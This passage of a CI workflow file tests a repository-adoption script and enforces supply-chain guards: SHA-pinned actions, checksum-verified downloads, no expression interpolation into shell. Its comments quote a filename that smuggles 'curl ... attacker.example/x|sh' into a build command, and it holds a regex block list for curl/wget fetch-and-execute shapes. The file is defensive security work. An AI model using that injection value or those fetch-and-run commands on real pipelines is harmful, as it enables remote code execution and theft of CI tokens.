          ./scripts/scan.sh --skip semgrep --skip gitleaks >/tmp/nogate.log 2>&1 || rc=$?
          # No allowlist means no licence line at all — not a passing one. An
          # empty status would render as a blank cell in the standing report,
          # which reads as "checked, clean".
          if grep -q '^  licenses' /tmp/nogate.log; then
            echo '::error::a licence line appeared with no allowlist given'; exit 1
          fi
          if [[ $rc -ne 0 ]]; then
            tail -30 /tmp/nogate.log
            # No licence line above, so this is osv finding a REAL vulnerability
            # in our own dependencies. Correct to fail on; just not this test's
            # subject, and the message should not send anyone to the wrong file.
            echo '::error::osv-scanner found a vulnerability in this repo. Not a licence-gate regression — fix or bump the dependency.'
            exit 1
          fi
          echo 'OK: licence gate fires on violation and stays off by default'

  # The sample .editorconfig is a COPY of configs/ (editorconfig has no import),
  # so it can drift from the thing it exists to test — and it had, by the time
  # #24 was written. Cheap guard, catches it at the PR.
  editorconfig-drift:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Sample .editorconfigs must match configs/ verbatim
        shell: bash
        run: |
          set -Eeuo pipefail
          cat configs/editorconfig configs/dotnet/dotnet.editorconfig > /tmp/expected.editorconfig
          for f in samples/dotnet/.editorconfig samples/dotnet-tests/.editorconfig samples/dotnet-clean/.editorconfig; do
            diff -u /tmp/expected.editorconfig "$f" || {
              echo "::error::$f has drifted from configs/ — regenerate it:"
              echo "::error::  cat configs/editorconfig configs/dotnet/dotnet.editorconfig > $f"
              exit 1
            }
          done
          echo 'OK: both sample .editorconfigs match configs/'

  # #11 — adopt.sh, proven end-to-end rather than by reading it. The assertion
  # that matters is not "it copied some files", it is "a repo adopted by the
  # script behaves exactly like the hand-configured sample" — in BOTH
  # directions. An adoption that produces a gate which does not gate is worse
  # than no adoption, because it looks green.
  adopt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
        with:
          dotnet-version: '10.0.x'
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
        with:
          python-version: '3.12'
      # PyYAML, because the Rust and Java steps below parse the workflow file
      # adopt.sh scaffolds. The runner image does not ship it, and this job is
      # the only one that needed it without installing it — which is why the
      # `rust:` assertion had never actually run.
      - name: Install PyYAML
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 -c 'import yaml' 2>/dev/null \
            || python3 -m pip install --quiet --break-system-packages 'pyyaml==6.0.3'
          python3 -c 'import yaml'
      - name: Exit codes and dry-run honesty
        shell: bash
        run: |
          set -uo pipefail
          mkdir -p /tmp/empty && echo hi > /tmp/empty/README.md
          rc=0; ./scripts/adopt.sh /tmp/empty      >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 1 ]] || { echo "::error::no-language repo should exit 1, got $rc"; exit 1; }
          rc=0; ./scripts/adopt.sh .               >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 3 ]] || { echo "::error::self-adopt should exit 3, got $rc"; exit 1; }
          rc=0; ./scripts/adopt.sh /nope/nope      >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 3 ]] || { echo "::error::missing dir should exit 3, got $rc"; exit 1; }
          # A dry run that writes anything is worse than no dry run at all.
          mkdir -p /tmp/dry && echo '{"name":"d"}' > /tmp/dry/package.json
          ./scripts/adopt.sh /tmp/dry --dry-run >/dev/null 2>&1
          if [[ -e /tmp/dry/eslint.base.mjs || -e /tmp/dry/.editorconfig ]]; then
            echo '::error::--dry-run wrote files'; exit 1
          fi
          echo 'OK: exit codes correct, --dry-run wrote nothing'
      - name: Adopted repo must BUILD CLEAN on the clean fixture
        shell: bash
        run: |
          set -Eeuo pipefail
          mkdir -p /tmp/consumer-clean
          cp samples/dotnet-clean/Program.cs /tmp/consumer-clean/
          cat > /tmp/consumer-clean/Consumer.csproj <<'CSPROJ'
          <Project Sdk="Microsoft.NET.Sdk">
            <PropertyGroup>
              <OutputType>Exe</OutputType>
              <TargetFramework>net10.0</TargetFramework>
              <RootNamespace>Maximalcode.Sample.Clean</RootNamespace>
            </PropertyGroup>
          </Project>
          CSPROJ
          ./scripts/adopt.sh /tmp/consumer-clean --no-workflow
          cd /tmp/consumer-clean
          rc=0; out=$(dotnet build --nologo --no-incremental 2>&1) || rc=$?
          echo "$out"
          [[ $rc -eq 0 ]] || { echo '::error::adopted repo failed on clean code'; exit 1; }
          if ! grep -qE '^ +0 Error\(s\)$' <<<"$out" || ! grep -qE '^ +0 Warning\(s\)$' <<<"$out"; then
            echo '::error::expected 0/0 from an adopted clean repo'
            exit 1
          fi
          echo 'OK: adopted repo builds clean code with 0/0'
      - name: Adopted repo must GATE on the bad fixture, identically
        shell: bash
        run: |
          set -Eeuo pipefail
          mkdir -p /tmp/consumer-bad
          # ALL the fixture sources, not just Program.cs. The claim below is
          # "the adopted repo reproduces the sample exactly", and with #8 the
          # sample grew two files — including the naming bait, which is the one
          # that proves `dotnet_diagnostic.IDE1006.severity` survives adoption
          # rather than only working in-tree. Copying one file made the claim
          # true of that file and not of the sample.
          cp samples/dotnet/*.cs /tmp/consumer-bad/
          cat > /tmp/consumer-bad/Consumer.csproj <<'CSPROJ'
          <Project Sdk="Microsoft.NET.Sdk">
            <PropertyGroup>
              <OutputType>Exe</OutputType>
              <TargetFramework>net10.0</TargetFramework>
              <RootNamespace>Maximalcode.Sample</RootNamespace>
            </PropertyGroup>
          </Project>
          CSPROJ
          ./scripts/adopt.sh /tmp/consumer-bad --no-workflow
          cd /tmp/consumer-bad
          rc=0; out=$(dotnet build --nologo --no-incremental 2>&1) || rc=$?
          echo "$out"
          [[ $rc -ne 0 ]] || { echo '::error::adopted repo did NOT gate on the bad fixture'; exit 1; }
          grep -qE '^ +23 Error\(s\)$' <<<"$out" || {
            echo '::error::adopted repo gave a different count than samples/dotnet (23)'; exit 1; }
          echo 'OK: adopted repo reproduces the sample exactly — 23 errors'
      - name: Refuses to write a Directory.Build.props MSBuild would ignore
        shell: bash
        run: |
          set -Eeuo pipefail
          # MSBuild stops at the FIRST Directory.Build.props walking up from a
          # project. Writing one above an existing one produces a file that is
          # never read: the gate looks adopted and analyses nothing. That is
          # the worst failure mode a quality tool has, so it must be loud.
          mkdir -p /tmp/shadowed/nested
          echo '<Project Sdk="Microsoft.NET.Sdk"></Project>' > /tmp/shadowed/nested/P.csproj
          echo '<Project></Project>' > /tmp/shadowed/nested/Directory.Build.props
          out=$(./scripts/adopt.sh /tmp/shadowed --no-workflow 2>&1)
          echo "$out"
          grep -q 'SILENTLY IGNORED' <<<"$out" || {
            echo '::error::adopt.sh did not warn about a shadowing Directory.Build.props'; exit 1; }
          if [[ -e /tmp/shadowed/Directory.Build.props ]]; then
            echo '::error::adopt.sh wrote a props file that MSBuild would ignore'; exit 1
          fi
          echo 'OK: refused to write a shadowed Directory.Build.props'

      # Ruff's `per-file-ignores` and `select` REPLACE the extended base rather
      # than merging, silently. A stub emitting the plain forms would strip the
      # baseline's assert-in-tests waiver and fail every adopting project's test
      # suite on S101 — found by running it, not by reading the docs. The stub
      # emits the extend- forms; this is what stops that regressing.
      - name: Adopted Python repo must gate identically, and keep inherited waivers
        shell: bash
        run: |
          set -Eeuo pipefail
          pip install -r samples/python/requirements-dev.txt >/dev/null
          mkdir -p /tmp/consumer-py/src /tmp/consumer-py/tests
          printf '[project]\nname = "demo"\nversion = "0.1.0"\n' > /tmp/consumer-py/pyproject.toml
          touch /tmp/consumer-py/uv.lock
          cp samples/python/src/bad.py /tmp/consumer-py/src/
          printf 'def test_x() -> None:\n    assert True\n' > /tmp/consumer-py/tests/test_x.py
          ./scripts/adopt.sh /tmp/consumer-py --no-workflow >/dev/null

          grep -q 'extend-per-file-ignores' /tmp/consumer-py/ruff.toml || {
            echo '::error::stub ruff.toml uses the REPLACING form — inherited waivers will be dropped'
            exit 1
          }

          rc=0; out=$(ruff check --output-format=concise /tmp/consumer-py 2>&1) || rc=$?
          echo "$out"
          [[ $rc -ne 0 ]] || { echo '::error::adopted Python repo did not gate'; exit 1; }
          # Same 14 as the hand-configured sample: adoption must not change the
          # verdict, in either direction.
          grep -q 'Found 14 errors' <<<"$out" || {
            echo '::error::adopted repo gave a different count than samples/python — adoption is not equivalent'
            exit 1
          }
          if grep -q 'tests/test_x.py.*S101' <<<"$out"; then
            echo '::error::assert-in-tests waiver was lost through extend — the stub clobbered it'
            exit 1
          fi
          echo 'OK: adopted Python repo gates at 14/14 and keeps inherited waivers'

      # #70's upgrade path. A repo adopted BEFORE Rust moved into the reusable
      # workflow still carries the scaffolded `rust:` job, and the reusable call
      # now runs Rust itself — two clippy runs, the second one pinned to a
      # toolchain that no longer moves. adopt.sh cannot rewrite a consumer's own
      # workflow file (write_new leaves it alone, deliberately), so saying it
      # out loud IS the fix, and an unsaid warning is no fix at all.
      - name: Warns a pre-#70 consumer carrying the scaffolded rust job
        shell: bash
        run: |
          set -Eeuo pipefail
          mkdir -p /tmp/old-rust/.github/workflows /tmp/old-rust/src
          printf '[package]\nname = "old"\nversion = "0.1.0"\n' > /tmp/old-rust/Cargo.toml
          : > /tmp/old-rust/Cargo.lock
          printf 'fn main() {}\n' > /tmp/old-rust/src/main.rs
          # The workflow a pre-#70 adopt.sh wrote — and then WITHOUT the comment
          # it used to carry, because the warning must key on the job rather
          # than on a marker the tidiest consumers are likeliest to have
          # deleted. Both shapes run clippy twice; both must be reported.
          cat > /tmp/wf-marked.yml <<'WF'
          name: quality
          on: [push, pull_request]
          jobs:
            quality:
              uses: maximalcode/maxi-quality/.github/workflows/quality.yml@v1
            # Rust Layer 1 (maxi-quality). Toolchain and cargo-deny are PINNED.
            rust:
              runs-on: ubuntu-latest
              steps:
                - run: cargo clippy --all-targets --locked
          WF
          cat > /tmp/wf-reworded.yml <<'WF'
          name: quality
          on: [push, pull_request]
          jobs:
            quality:
              uses: maximalcode/maxi-quality/.github/workflows/quality.yml@v1
            rust:
              runs-on: ubuntu-latest
              steps:
                - run: cargo clippy --all-targets --locked
          WF
          for variant in marked reworded; do
            cp "/tmp/wf-$variant.yml" /tmp/old-rust/.github/workflows/quality.yml
            before=$(sha256sum /tmp/old-rust/.github/workflows/quality.yml | cut -d' ' -f1)
            out=$(./scripts/adopt.sh /tmp/old-rust 2>&1)
            echo "$out"
            grep -q "already declares a 'rust:' job of its own" <<<"$out" || {
              echo "::error::[$variant] adopt.sh did not warn about the second rust job — a consumer would run clippy twice"
              exit 1; }
            after=$(sha256sum /tmp/old-rust/.github/workflows/quality.yml | cut -d' ' -f1)
            [[ "$before" == "$after" ]] || {
              echo "::error::[$variant] adopt.sh rewrote the consumer workflow — it must warn, not clobber"; exit 1; }
            echo "  OK  $variant"
          done
          echo 'OK: a second rust job is reported with or without the old marker comment'

      # A repo adopted TODAY gets the same six lines as every other language.
      # This is the assertion that the scaffolded job is gone, not merely
      # unused: a stray `rust:` here is #70 reopening itself.
      - name: A fresh Rust adoption gets the plain six-line workflow
        shell: bash
        run: |
          set -Eeuo pipefail
          mkdir -p /tmp/new-rust/src
          printf '[package]\nname = "new"\nversion = "0.1.0"\n' > /tmp/new-rust/Cargo.toml
          : > /tmp/new-rust/Cargo.lock
          printf 'fn main() {}\n' > /tmp/new-rust/src/main.rs
          ./scripts/adopt.sh /tmp/new-rust >/dev/null
          wf=/tmp/new-rust/.github/workflows/quality.yml
          cat "$wf"
          python3 -c "import sys, yaml; yaml.safe_load(open(sys.argv[1]))" "$wf"
          if grep -qE '^\s+rust:' "$wf"; then
            echo '::error::adopt.sh still scaffolds a rust job — it belongs in the reusable workflow now'
            exit 1
          fi
          n=$(python3 -c "import sys, yaml; print(len(yaml.safe_load(open(sys.argv[1]))['jobs']))" "$wf")
          [[ "$n" -eq 1 ]] || { echo "::error::expected exactly 1 job in a fresh adoption, got $n"; exit 1; }
          echo 'OK: a Rust repo adopts the same six lines as every other language'

      - name: Idempotent, and never clobbers
        shell: bash
        run: |
          set -Eeuo pipefail
          before=$(sha256sum /tmp/consumer-bad/Directory.Build.props | cut -d' ' -f1)
          ./scripts/adopt.sh /tmp/consumer-bad --no-workflow > /tmp/rerun.log 2>&1
          after=$(sha256sum /tmp/consumer-bad/Directory.Build.props | cut -d' ' -f1)
          [[ "$before" == "$after" ]] || { echo '::error::re-run overwrote an existing file'; exit 1; }
          # The C# editorconfig section must not be appended twice.
          n=$(grep -c 'maxi-quality — C# analyzer severities' /tmp/consumer-bad/.editorconfig)
          [[ "$n" -eq 1 ]] || { echo "::error::C# editorconfig section appended $n times"; exit 1; }
          grep -q 'skip' /tmp/rerun.log || { echo '::error::re-run did not report skips'; exit 1; }
          echo 'OK: re-run is idempotent and non-destructive'

  # #13 — Semgrep is pinned in two places: the layer2 action's input default and
  # the layer2-counts job below. If they drift, CI asserts 100 findings against a
  # Semgrep that consumers never run, and the samples quietly stop meaning what
  # they claim. Offline on PRs; the weekly `pins` workflow does the upstream half.
  version-pins:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Pinned tool versions must be internally consistent
        shell: bash
        run: ./scripts/check-pins.sh --offline

  # quality.yml is CONSUMER-FACING and nothing else here executes it — ci.yml is
  # the self-test, quality.yml is what other repos call. So a change to it (an
  # action major bump, a renamed input) can go green on every job above and
  # still be broken for every consumer.
  #
  # actionlint is not a full substitute for the acceptance test, but it catches
  # the structural half for free: invalid syntax, bad `uses:` refs, undefined
  # inputs, shell bugs inside `run:` blocks.
  workflow-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Lint every workflow, including the consumer-facing one
        shell: bash
        env:
          ACTIONLINT_VERSION: '1.7.12'
          # From actionlint_<version>_checksums.txt in the release. Verifying it
          # is the difference between "we downloaded a binary" and "we
          # downloaded THAT binary".
          ACTIONLINT_SHA256: '8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8'
        run: |
          set -Eeuo pipefail
          # Was: bash <(curl .../actionlint/main/scripts/download-actionlint.bash)
          # — unpinned code from a third party's moving branch, executed in CI.
          # Lower stakes than the same shape in quality.yml (this token is
          # read-only and PRs get no secrets) but it is the pattern this repo
          # exists to argue against, and the SHA-pin guard below now rejects it.
          curl -sSfL -o /tmp/actionlint.tgz \
            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
          echo "${ACTIONLINT_SHA256}  /tmp/actionlint.tgz" | sha256sum -c -
          tar -xzf /tmp/actionlint.tgz -C /tmp actionlint
          /tmp/actionlint -color -verbose
          echo 'OK: all workflows lint clean'

      # Third-party actions must be pinned to a full commit SHA, never a tag.
      # A tag is mutable: whoever controls it can point it at new code, and that
      # code then runs in every consumer's CI with their GITHUB_TOKEN. This is
      # the supply-chain hole that `pins.yml` already closes for the scanner
      # binaries; actions were simply never covered.
      #
      # `maximalcode/*@v1` is EXEMPT and must stay so: our own moving tag is how
      # consumers pick up fixes without editing a file, it is our repo to move,
      # and it only moves after this CI is green (release-tag.yml).
      - name: Third-party actions must be SHA-pinned
        shell: bash
        run: |
          set -Eeuo pipefail
          # examples/ is in the roots because examples/README.md calls that
          # directory "the correct thing to copy" — an unpinned action there is
          # this guard teaching the opposite of what it enforces.
          bad=$(grep -rhoE 'uses: [A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[A-Za-z0-9._-]+' \
                  .github/workflows/ actions/ examples/ \
                | grep -vE '@[0-9a-f]{40}' \
                | grep -vE '^uses: maximalcode/' \
                | sort -u || true)
          if [[ -n "$bad" ]]; then
            echo '::error::these actions are pinned to a MUTABLE tag — use the full commit SHA:'
            echo "$bad"
            echo 'Resolve with: gh api repos/OWNER/REPO/git/ref/tags/TAG --jq .object.sha'
            echo 'Keep the tag as a trailing comment so Dependabot can still bump it.'
            exit 1
          fi
          echo 'OK: every third-party action is pinned to a commit SHA'

      # Issue forms fail SILENTLY: a malformed one is not a red check anywhere,
      # it is an error banner on the new-issue page that only a stranger trying
      # to file sees. actionlint does not read them. So parse them here, and
      # assert the two things that make them worth having — every form carries
      # the public-tracker warning, and every label it auto-applies exists.
      - name: Issue forms must parse, warn about the public tracker, and use real labels
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 - <<'PY'
          import sys, pathlib, yaml

          d = pathlib.Path(".github/ISSUE_TEMPLATE")
          forms = sorted(p for p in d.glob("*.yml") if p.name != "config.yml")
          if not forms:
              sys.exit("::error::no issue forms found in .github/ISSUE_TEMPLATE/")

          known = {"needs-triage", "needs-info", "ready-for-agent",
                   "ready-for-human", "wontfix", "bug", "enhancement",
                   "documentation", "question", "eval", "adoption"}
          bad = 0
          for p in [*forms, d / "config.yml"]:
              try:
                  doc = yaml.safe_load(p.read_text())
              except yaml.YAMLError as e:
                  print(f"::error::{p} is not valid YAML: {e}")
                  bad = 1
                  continue
              if p.name == "config.yml":
                  continue
              for field in ("name", "description", "body"):
                  if not doc.get(field):
                      print(f"::error::{p} is missing required field: {field}")
                      bad = 1
              # §2: this tracker is public and permanent, and a stranger filing
              # an issue has not read CLAUDE.md. The warning has to be ON the form.
              text = p.read_text()
              if "public and permanent" not in text:
                  print(f"::error::{p} does not warn that the tracker is public and permanent")
                  bad = 1
              for lab in doc.get("labels", []):
                  if lab not in known:
                      print(f"::error::{p} auto-applies unknown label: {lab}")
                      bad = 1
              print(f"  OK  {p.name}")
          sys.exit(bad)
          PY
          echo 'OK: every issue form parses, warns, and uses labels that exist'

      # The hole the check above left open for months: it matches `uses:` lines,
      # and a pipe is not a `uses:` line. So quality.yml could — and did — carry
      #
      #     curl -LsSf https://astral.sh/uv/install.sh | sh
      #
      # inside the workflow that runs in EVERY consumer's CI with THEIR token,
      # while this job reported "every third-party action is pinned". A guard
      # that is satisfied while the thing it guards against is present in the
      # same file is worse than no guard, because it is quoted as evidence.
      #
      # Downloading is fine. Downloading and EXECUTING without a pin and a
      # checksum is not.
      # SCOPE AND SHAPES BOTH WIDENED FOR #3. Two measured holes:
      #
      # 1. `scripts/` was never scanned. actions/layer2/action.yml executes
      #    scripts/scan.sh, so those 895 lines run in every consumer's CI with
      #    their token — the same reason quality.yml is in scope, and the one
      #    directory this guard could not see.
      # 2. The pattern matched PIPES ONLY. Measured against eleven planted
      #    shapes, five were invisible: `curl -o F && sh F`, the `;` variant,
      #    the `sudo` variant, `eval "$(curl ...)"`, and download-then-chmod+x.
      #    That is not a hypothetical class — the digest-verification work
      #    landed precisely because the pipe guard could not see
      #    `curl -o ... && sudo install`.
      #
      # The `source <(curl ...)` form the issue also listed was already caught:
      # the `<(` alternation does not care which command consumes it. Verified
      # rather than assumed, and left alone.
      - name: No unpinned remote code execution
        shell: bash
        run: |
          set -Eeuo pipefail
          # Alternations, in order: curl|sh · <(curl) process substitution ·
          # eval of a command substitution · fetch-then-run on one line, with
          # `&&` or `;`, optionally under sudo · fetch-then-chmod +x, which
          # executes a path rather than a shell and so names no interpreter.
          #
          # `[^;&]*` between the fetch and the run keeps each alternation inside
          # ONE command, so an unrelated `sh` later on the line is not a hit.
          PATTERN='(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(ba)?sh'
          PATTERN+='|<\([[:space:]]*(curl|wget)'
          PATTERN+='|eval[^;]*(curl|wget)'
          PATTERN+='|(curl|wget)[^;&]*(&&|;)[[:space:]]*(sudo[[:space:]]+)?(ba)?sh([[:space:]]|$)'
          PATTERN+='|(curl|wget)[^;&]*(&&|;)[^;&]*chmod[[:space:]]+[^;&]*\+x'
          # Built from what exists, so adding .github/actions/ later is covered
          # without editing this line, and a missing directory is not a fatal
          # grep rather than a silently skipped scope.
          SCAN=(.github/workflows actions scripts)
          [[ -d .github/actions ]] && SCAN+=(.github/actions)
          # The second grep drops COMMENT lines. Both YAML and shell comments
          # start with #, and this file documents the very patterns it bans —
          # without this, the guard fails on its own rationale, and the fix
          # someone reaches for is deleting the explanation.
          bad=$(grep -rnE "$PATTERN" "${SCAN[@]}" \
                | grep -vE '^[^:]+:[0-9]+:[[:space:]]*#' || true)
          if [[ -n "$bad" ]]; then
            echo '::error::remote code is fetched and executed without a version pin and a checksum:'
            echo "$bad"
            echo 'Use a SHA-pinned action, or download a pinned release and verify it with sha256sum -c.'
            exit 1
          fi
          echo "OK: no unpinned remote code execution in ${SCAN[*]}"

          # THE GUARD IS ITSELF GUARDED, in this step rather than a separate one
          # so the pattern under test IS the pattern above and cannot drift from
          # a copy. A widened regex that quietly matches nothing reads exactly
          # like a clean tree, which is the failure this repo keeps meeting: a
          # check that is satisfied while the thing it guards against is present.
          #
          # The corpus lives in samples/guards/ rather than inline here, because
          # inline the shapes were real hits in a scanned file and the guard
          # failed on its own test data. See the header of that file.
          fails=0
          caught=0
          missed=0
          while IFS= read -r shape; do
            [[ -z "$shape" || "$shape" == \#* ]] && continue
            if printf '%s\n' "$shape" | grep -qE "$PATTERN"; then
              caught=$((caught + 1))
            else
              echo "::error::the guard no longer catches: $shape"
              fails=1
            fi
          done < samples/guards/banned-fetch-exec.txt
          while IFS= read -r shape; do
            [[ -z "$shape" || "$shape" == \#* ]] && continue
            if printf '%s\n' "$shape" | grep -qE "$PATTERN"; then
              echo "::error::the guard now false-positives on: $shape"
              fails=1
            else
              missed=$((missed + 1))
            fi
          done < samples/guards/allowed-fetch-exec.txt
          # An empty corpus passes both loops without asserting anything.
          [[ $caught -gt 0 && $missed -gt 0 ]] || {
            echo '::error::the guard corpus is empty — this self-test stopped testing'; exit 1; }
          [[ $fails -eq 0 ]] || exit 1
          echo "OK: the guard catches all $caught banned shapes and none of the $missed controls"

      # Composite actions reach the baseline's scripts through
      # ${GITHUB_ACTION_PATH}/../../scripts/... — that is the whole reason they
      # are composite actions rather than a checkout of this private repo (see
      # actions/report-issue). It also means moving or renaming a script breaks
      # every consumer at RUNTIME, in a workflow nothing here executes, with a
      # "No such file or directory" that points at a path on someone else's
      # runner. actionlint does not look inside the string.
      - name: Every GITHUB_ACTION_PATH reference must resolve
        shell: bash
        run: |
          set -Eeuo pipefail
          missing=0
          checked=0
          # BRACES ARE NOW OPTIONAL (#3). The pattern matched `${GITHUB_ACTION_PATH}`
          # only, so the equally valid `$GITHUB_ACTION_PATH/../../scripts/x.sh`
          # was invisible — and an unresolvable one of those breaks a consumer at
          # runtime exactly the same way. Nothing in the tree uses the unbraced
          # form today; the guard should not depend on that staying true.
          ACTION_DIRS=(actions)
          [[ -d .github/actions ]] && ACTION_DIRS+=(.github/actions)
          while IFS=: read -r file ref; do
            # ${GITHUB_ACTION_PATH} is the directory holding that action.yml, so
            # resolve each reference relative to ITS OWN action — not to some
            # other one that happens to sit at the same depth.
            rel="${ref#*GITHUB_ACTION_PATH}"
            rel="${rel#\}}"
            path="${file%/*}/${rel#/}"
            checked=$((checked + 1))
            if [[ ! -e "$path" ]]; then
              echo "::error file=$file::unresolvable reference \$GITHUB_ACTION_PATH$rel (looked for $path)"
              missing=1
            fi
          done < <(grep -roE '\$\{?GITHUB_ACTION_PATH\}?[^"'"'"' ]*' "${ACTION_DIRS[@]}" | sort -u)
          [[ "$checked" -gt 0 ]] || {
            echo '::error::found no GITHUB_ACTION_PATH references at all — this guard stopped guarding'
            exit 1; }
          [[ "$missing" -eq 0 ]] || exit 1
          echo "OK: all $checked composite-action script references resolve"

      # actionlint lints WORKFLOWS. It does not read actions/*/action.yml at
      # all — so the composite actions, which are the part every consumer
      # actually executes, had no shell linting whatsoever. The report action
      # shipped broken through exactly that gap.
      #
      # Extract each bash `run:` body and shellcheck it, with `${{ }}` replaced
      # by a variable reference so the expression syntax does not confuse the
      # parser (substituting a literal instead makes every `[[ -n "..." ]]` look
      # constant, which is noise, not signal).
      # `${{ }}` inside a `run:` body is substituted into the script TEXT before
      # bash parses it, so a value carrying a quote stops being a value and
      # becomes code. Inside `env:` it is passed as data.
      #
      # THIS CHECK ORIGINALLY SCANNED ONLY actions/, AND THAT GAP WAS THE BUG.
      # The most dangerous instance of the exact banned pattern was one
      # directory up, in the consumer-facing workflow:
      #
      #     - run: dotnet build "${{ matrix.target }}"
      #
      # `matrix.target` is a FILENAME globbed out of the consumer's own tree —
      # i.e. whatever a contributor put in a pull request. A file named
      # `a";curl -sL https://attacker.example/x|sh;".csproj` closed the quoted
      # argument and ran the rest as shell, in the CONSUMER's CI with the
      # consumer's token. Found in the second security review, after the first
      # one added this check and scoped it too narrowly.
      #
      # It now covers workflows AND actions, with NO allowlist. Values that are
      # provably safe today (a run outcome, a GitHub-generated SHA) still go
      # through env:, because an exception list is where the next real one hides.
      - name: No expression interpolated into any shell body, anywhere
        shell: bash
        run: |
          set -Eeuo pipefail
          # Runner images usually already have PyYAML; PEP 668 marks the system
          # Python externally-managed on newer Ubuntu, so a bare `pip install`
          # can hard-fail. Try in order, then assert rather than continue with a
          # guard that would silently extract nothing.
          python3 -c 'import yaml' 2>/dev/null \
            || python3 -m pip install --quiet 'pyyaml==6.0.3' 2>/dev/null \
            || python3 -m pip install --quiet --break-system-packages 'pyyaml==6.0.3'
          python3 -c 'import yaml'

          rm -rf /tmp/blocks && mkdir -p /tmp/blocks
          python3 - <<'PY'
          import pathlib, re, sys, yaml

          EXPR = re.compile(r'\$\{\{[^}]*\}\}')
          out = pathlib.Path('/tmp/blocks')
          n = 0
          bad = []

          def steps_of(doc):
              """Every run: step, from a composite action OR a workflow."""
              yield from doc.get('runs', {}).get('steps', [])
              for job in (doc.get('jobs') or {}).values():
                  # A `uses:` job (reusable-workflow call) has no steps.
                  yield from (job or {}).get('steps', []) or []

          # GLOBS WIDENED FOR #3. `*/action.yml` missed three real shapes: a
          # `.yaml` extension, an action nested deeper than one directory, and
          # anything under .github/actions/. Each would have been a file this
          # guard reported clean because it never opened it — the same failure
          # the header above describes, one directory over.
          def discover():
              seen = set()
              for root in ('actions', '.github/actions'):
                  base = pathlib.Path(root)
                  if not base.is_dir():
                      continue
                  for pat in ('**/action.yml', '**/action.yaml'):
                      seen.update(base.glob(pat))
              wf = pathlib.Path('.github/workflows')
              for pat in ('*.yml', '*.yaml'):
                  seen.update(wf.glob(pat))
              return sorted(seen)

          targets = discover()
          for p in targets:
              doc = yaml.safe_load(p.read_text())
              for i, step in enumerate(steps_of(doc)):
                  body = step.get('run')
                  if body is None:
                      continue
                  bad += [f'{p} step {i}: {m}' for m in EXPR.findall(body)]
                  # Only bash blocks get shellchecked. A workflow step without
                  # an explicit `shell:` still defaults to bash on ubuntu, so
                  # absence is treated as bash rather than skipped — skipping is
                  # how a step avoids review by omitting one line.
                  if step.get('shell', 'bash') != 'bash':
                      continue
                  # Substitute a VARIABLE reference, not a literal: a literal
                  # makes every `[[ -n "..." ]]` look constant to shellcheck,
                  # which is noise rather than signal.
                  safe = p.as_posix().replace('/', '--').replace('.', '_')
                  (out / f'{safe}--step{i}.sh').write_text(
                      '#!/usr/bin/env bash\n' + EXPR.sub('${GHA_EXPR}', body))
                  n += 1
          for b in bad:
              print('::error::expression interpolated into a shell body — '
                    f'pass it through env: instead — {b}')
          if n == 0:
              sys.exit('::error::extracted 0 shell blocks — this guard stopped guarding')
          print(f'extracted {n} shell blocks from workflows and composite actions')
          sys.exit(1 if bad else 0)
          PY
          # SC2154 off: RUNNER_TEMP, GITHUB_ACTION_PATH and friends are set by
          # the runner, and the GHA_EXPR placeholder is assigned by definition.
          shellcheck -s bash -e SC2154 /tmp/blocks/*.sh
          echo 'OK: every workflow and composite-action shell block is shellcheck-clean and passes inputs via env:'

      # The step above lints shell EMBEDDED in YAML. The 895 lines in scripts/
      # were linted by nothing at all — and scripts/scan.sh is not incidental
      # tooling, it is what actions/layer2 executes in every consumer's CI.
      #
      # This is a ratchet, not a cleanup: measured before adding, all three
      # scripts are already clean at default severity, so the check costs
      # nothing today and is only ever paid by a regression.
      - name: Every shipped script must be shellcheck-clean
        shell: bash
        run: |
          set -Eeuo pipefail
          shopt -s nullglob
          files=(scripts/*.sh)
          # A glob that stops matching is silence, and silence reads as success.
          [[ ${#files[@]} -gt 0 ]] || {
            echo '::error::found no scripts/*.sh — this guard stopped guarding'; exit 1; }
          shellcheck -s bash "${files[@]}"
          echo "OK: ${#files[@]} shipped scripts are shellcheck-clean"

      # CLAUDE.md: "a job that runs but is not on the required list reports and
      # blocks nothing, which is indistinguishable from a passing gate in the PR
      # UI." That has now drifted twice — four jobs the first time, this
      # milestone's own two the second — and both times the tell was a written
      # count nobody recomputed.
      #
      # The required list itself cannot be read from here: the branch-protection
      # API needs admin rights, and this job's token is read-only by design. So
      # what is asserted is the half that IS reachable — the number written in
      # the docs must equal the number of contexts ci.yml produces. It does not
      # prove the contexts are set; it makes adding a job collide with the
      # sentence that says to set them.
      #
      # Contexts, not jobs: `layer2` is a two-leg matrix, so the two counts
      # differ by one, and "one per job" was the wording that hid that.
      - name: The documented required-check count must match ci.yml
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 - <<'PY'
          import re, sys, pathlib, yaml

          jobs = yaml.safe_load(pathlib.Path(".github/workflows/ci.yml")
                                .read_text())["jobs"]
          contexts = 0
          for name, job in jobs.items():
              matrix = (job.get("strategy") or {}).get("matrix") or {}
              # include/exclude change the leg count in ways a product of list
              # lengths cannot express — include adds legs, exclude removes
              # them, and an include-only matrix would count as 1. Nothing here
              # uses either, so this refuses rather than guessing: a silent
              # miscount is the exact drift this guard exists to catch.
              if "include" in matrix or "exclude" in matrix:
                  sys.exit(f"::error::job '{name}' uses a matrix include/exclude, "
                           "which this counter cannot expand — teach it how "
                           "before adding one")
              legs = 1
              for values in matrix.values():
